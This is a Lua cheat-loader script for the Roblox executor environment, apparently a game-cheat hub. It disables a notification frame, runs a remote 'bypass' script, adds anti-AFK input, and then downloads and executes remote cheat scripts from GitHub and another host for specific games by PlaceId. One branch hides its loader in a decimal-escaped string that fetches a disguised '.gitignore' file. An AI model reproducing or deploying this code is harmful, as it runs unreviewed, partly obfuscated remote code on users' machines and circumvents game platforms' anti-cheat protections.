game:WaitForChild("CoreGui").RobloxGui:WaitForChild("NotificationFrame"):Destroy()
loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/synxbypass.lua"))()
repeat wait() until game:IsLoaded()
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
wait(1)
vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
print('anti afk run')

if game.PlaceId == 4520749081 or game.PlaceId == 6381829480 or game.PlaceId == 5931540094 then --//KingLegacy
    loadstring(game:HttpGet("https://raw.githubusercontent.com/sannin9000/scripts/main/kinglegacy.lua"))()
elseif game.PlaceId == 2753915549 or game.PlaceId == 4442272183 then --//BloxFruits
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/mainblox.lua"))()
elseif game.PlaceId == 6461766546 then --// ahd
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ttd1108/Script/master/aherosdestiny2'), true))()
elseif game.PlaceId == 914010731 then --//roghoul
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/z4gs/scripts/master/Ro-Ghoul%20Auto%20Farm.lua"))()
elseif game.PlaceId == 4996049426 or game.PlaceId == 5552815761 then
    loadstring(game:HttpGet('https://raw.githubusercontent.com/XxBoomer/script/main/AllStarTD/combosh.lua'))()
elseif game.PlaceId == 2788229376 then --//dahood
    repeat
    wait();
    until game:IsLoaded() and game:GetService("Players").LocalPlayer;
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\86\97\110\105\115\50\53\50\47\118\97\108\105\97\110\116\47\109\97\105\110\47\46\103\105\116\105\103\110\111\114\101\34\41\44\32\116\114\117\101\41\41\40\41\10")();
elseif game.PlaceId == 4616652839 or game.PlaceId == 4601350214 or game.PlaceId == 4601350809 or game.PlaceId == 4601350656 or game.PlaceId == 4601350760 or game.PlaceId == 4601350394 or game.PlaceId == 5447073001 or game.PlaceId == 5447073001 or game.PlaceId == 5084678830 or game.PlaceId == 5431071837 or game.PlaceId == 5431069982 then
    loadstring(game:HttpGet("https://bruh.keshsenpai.com/.lua"))()
elseif game.PlaceId == 5824792748 then --//War Shindo
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/shinobilife2/warmode.lua"))()
elseif game.PlaceId == 6938803436 or game.PlaceId == 6990131029 then --//anime dimensions
    loadstring(game:HttpGet("https://raw.githubusercontent.com/XxBoomer/script/main/ad/main.lua"))()
elseif game.PlaceId == 537413528 then --//build a boat for treasua
    loadstring(game:HttpGet("https://raw.githubusercontent.com/S0LDR/lua-shit/master/protonbabft.lua", true))();
else
    print("")
end
